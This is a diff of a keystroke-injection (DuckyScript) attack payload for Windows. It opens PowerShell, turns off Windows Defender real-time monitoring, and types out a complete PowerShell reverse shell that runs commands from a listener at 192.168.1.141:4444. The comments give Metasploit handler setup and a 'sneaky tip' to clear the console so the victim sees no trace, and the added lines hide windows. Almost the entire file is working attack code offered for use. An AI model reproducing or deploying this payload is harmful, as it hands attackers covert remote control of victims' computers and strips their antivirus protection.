@@ -1,6 +1,6 @@
 REM for linux machine to capture the shell use msfconsole aka metasploit then do use exploit/multi/handler then set LHOST & LPORT to maybe 4444 or 9001 for LPORT alow if port not open use, sudo ufw allow 4444 after complete
 REM run, exploit then run the script and should have shell access
-REM made by BisKit
+REM made by BisKit, another sneaky tip if you end up getting a reverse shell make sure to do command, clear to remove all the powershell shell script so its just no text for them if they open the powershell tab 
 WINDOWS r
 DELAY 200
 STRING powershell
@@ -15,15 +15,25 @@ DELAY 1093
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 729
+ALT-TAB
+DELAY 440
 ALT F4
+DELAY 530
+ALT-TAB
+DELAY 580
+STRING exit
+ENTER
+DELAY 539
+ALT-TAB
+DELAY 580
 ALT F4
 DELAY 290
 WINDOWS r
 DELAY 115
 STRING powershell
 ENTER
-DELAY 895
-STRING $LHOST = "yourIP"; $LPORT = yourPORT; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+DELAY 500
+STRING $LHOST = "192.168.1.141"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 ENTER 
 DELAY 110
 WINDOWS d
